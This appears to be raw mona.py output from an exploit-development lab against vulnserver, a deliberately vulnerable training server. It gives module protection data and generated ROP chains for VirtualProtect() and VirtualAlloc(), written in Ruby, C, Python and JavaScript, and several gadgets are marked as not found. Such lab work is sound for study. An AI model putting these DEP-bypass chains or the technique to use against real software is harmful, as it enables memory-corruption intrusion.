================================================================================
  Output generated by mona.py v2.0, rev 596 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : vulnserver (pid 1228)
  Current mona arguments: rop -m essfunc.dll,vulnserver.exe
================================================================================
  2020-11-07 14:06:08
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x76e60000 | 0x76e66000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\Florian\Documents\vulnserver-master\essfunc.dll)
 0x758f0000 | 0x7593a000 | 0x0004a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\Florian\Documents\vulnserver-master\vulnserver.exe)
 0x76130000 | 0x76204000 | 0x000d4000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x76040000 | 0x760ec000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x77730000 | 0x7786c000 | 0x0013c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x76fd0000 | 0x77071000 | 0x000a1000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x76000000 | 0x76035000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.DLL] (C:\Windows\system32\WS2_32.DLL)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x625011f2,  # POP EBP # RETN [essfunc.dll] 
      0x625011c7,  # & jmp esp [essfunc.dll]
      0x625011c0,  # POP EBX # RETN [essfunc.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x625011e4,  # POP EDX # RETN [essfunc.dll] 
      0x00000040,  # 0x00000040-> edx
      0x6250120c,  # POP ECX # RETN [essfunc.dll] 
      0x00405f1c,  # &Writable location [vulnserver.exe]
      0x00402d2e,  # POP EDI # POP EBP # RETN [vulnserver.exe] 
      0x625011f1,  # RETN (ROP NOP) [essfunc.dll]
      0x41414141,  # Filler (compensate)
      0x625011b4,  # POP EAX # RETN [essfunc.dll] 
      0x90909090,  # nop
      0x00000000,  # [-] Unable to find pushad gadget
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
      0x6250609c,  // ptr to &VirtualProtect() [IAT essfunc.dll]
      0x625011f2,  // POP EBP // RETN [essfunc.dll] 
      0x625011c7,  // & jmp esp [essfunc.dll]
      0x625011c0,  // POP EBX // RETN [essfunc.dll] 
      0x00000201,  // 0x00000201-> ebx
      0x625011e4,  // POP EDX // RETN [essfunc.dll] 
      0x00000040,  // 0x00000040-> edx
      0x6250120c,  // POP ECX // RETN [essfunc.dll] 
      0x00405f1c,  // &Writable location [vulnserver.exe]
      0x00402d2e,  // POP EDI // POP EBP // RETN [vulnserver.exe] 
      0x625011f1,  // RETN (ROP NOP) [essfunc.dll]
      0x41414141,  // Filler (compensate)
      0x625011b4,  // POP EAX // RETN [essfunc.dll] 
      0x90909090,  // nop
      0x00000000,  // [-] Unable to find pushad gadget
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x625011f2,  # POP EBP # RETN [essfunc.dll] 
      0x625011c7,  # & jmp esp [essfunc.dll]
      0x625011c0,  # POP EBX # RETN [essfunc.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x625011e4,  # POP EDX # RETN [essfunc.dll] 
      0x00000040,  # 0x00000040-> edx
      0x6250120c,  # POP ECX # RETN [essfunc.dll] 
      0x00405f1c,  # &Writable location [vulnserver.exe]
      0x00402d2e,  # POP EDI # POP EBP # RETN [vulnserver.exe] 
      0x625011f1,  # RETN (ROP NOP) [essfunc.dll]
      0x41414141,  # Filler (compensate)
      0x625011b4,  # POP EAX # RETN [essfunc.dll] 
      0x90909090,  # nop
      0x00000000,  # [-] Unable to find pushad gadget
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
    "%u609c%u6250" + // 0x6250609c : ,# ptr to &VirtualProtect() [IAT essfunc.dll]
    "%u11f2%u6250" + // 0x625011f2 : ,# POP EBP # RETN [essfunc.dll] 
    "%u11c7%u6250" + // 0x625011c7 : ,# & jmp esp [essfunc.dll]
    "%u11c0%u6250" + // 0x625011c0 : ,# POP EBX # RETN [essfunc.dll] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%u11e4%u6250" + // 0x625011e4 : ,# POP EDX # RETN [essfunc.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "%u120c%u6250" + // 0x6250120c : ,# POP ECX # RETN [essfunc.dll] 
    "%u5f1c%u0040" + // 0x00405f1c : ,# &Writable location [vulnserver.exe]
    "%u2d2e%u0040" + // 0x00402d2e : ,# POP EDI # POP EBP # RETN [vulnserver.exe] 
    "%u11f1%u6250" + // 0x625011f1 : ,# RETN (ROP NOP) [essfunc.dll]
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u11b4%u6250" + // 0x625011b4 : ,# POP EAX # RETN [essfunc.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
      0x00000000,  # [-] Unable to find ptr to &VirtualAlloc()
      0x625011b6,  # POP EBP # RETN [essfunc.dll] 
      0x625011c7,  # & jmp esp [essfunc.dll]
      0x625011d8,  # POP EBX # RETN [essfunc.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x625011fc,  # POP EDX # RETN [essfunc.dll] 
      0x00001000,  # 0x00001000-> edx
      0x6250120c,  # POP ECX # RETN [essfunc.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x00402afb,  # POP EDI # POP EBP # RETN [vulnserver.exe] 
      0x625011f1,  # RETN (ROP NOP) [essfunc.dll]
      0x41414141,  # Filler (compensate)
      0x625011b4,  # POP EAX # RETN [essfunc.dll] 
      0x90909090,  # nop
      0x00000000,  # [-] Unable to find pushad gadget
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
      0x00000000,  // [-] Unable to find ptr to &VirtualAlloc()
      0x625011b6,  // POP EBP // RETN [essfunc.dll] 
      0x625011c7,  // & jmp esp [essfunc.dll]
      0x625011d8,  // POP EBX // RETN [essfunc.dll] 
      0x00000001,  // 0x00000001-> ebx
      0x625011fc,  // POP EDX // RETN [essfunc.dll] 
      0x00001000,  // 0x00001000-> edx
      0x6250120c,  // POP ECX // RETN [essfunc.dll] 
      0x00000040,  // 0x00000040-> ecx
      0x00402afb,  // POP EDI // POP EBP // RETN [vulnserver.exe] 
      0x625011f1,  // RETN (ROP NOP) [essfunc.dll]
      0x41414141,  // Filler (compensate)
      0x625011b4,  // POP EAX // RETN [essfunc.dll] 
      0x90909090,  // nop
      0x00000000,  // [-] Unable to find pushad gadget
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
      0x00000000,  # [-] Unable to find ptr to &VirtualAlloc()
      0x625011b6,  # POP EBP # RETN [essfunc.dll] 
      0x625011c7,  # & jmp esp [essfunc.dll]
      0x625011d8,  # POP EBX # RETN [essfunc.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x625011fc,  # POP EDX # RETN [essfunc.dll] 
      0x00001000,  # 0x00001000-> edx
      0x6250120c,  # POP ECX # RETN [essfunc.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x00402afb,  # POP EDI # POP EBP # RETN [vulnserver.exe] 
      0x625011f1,  # RETN (ROP NOP) [essfunc.dll]
      0x41414141,  # Filler (compensate)
      0x625011b4,  # POP EAX # RETN [essfunc.dll] 
      0x90909090,  # nop
      0x00000000,  # [-] Unable to find pushad gadget
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to &VirtualAlloc()
    "%u11b6%u6250" + // 0x625011b6 : ,# POP EBP # RETN [essfunc.dll] 
    "%u11c7%u6250" + // 0x625011c7 : ,# & jmp esp [essfunc.dll]
    "%u11d8%u6250" + // 0x625011d8 : ,# POP EBX # RETN [essfunc.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "%u11fc%u6250" + // 0x625011fc : ,# POP EDX # RETN [essfunc.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "%u120c%u6250" + // 0x6250120c : ,# POP ECX # RETN [essfunc.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "%u2afb%u0040" + // 0x00402afb : ,# POP EDI # POP EBP # RETN [vulnserver.exe] 
    "%u11f1%u6250" + // 0x625011f1 : ,# RETN (ROP NOP) [essfunc.dll]
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u11b4%u6250" + // 0x625011b4 : ,# POP EAX # RETN [essfunc.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
    ""); //  : 


--------------------------------------------------------------------------------------------------

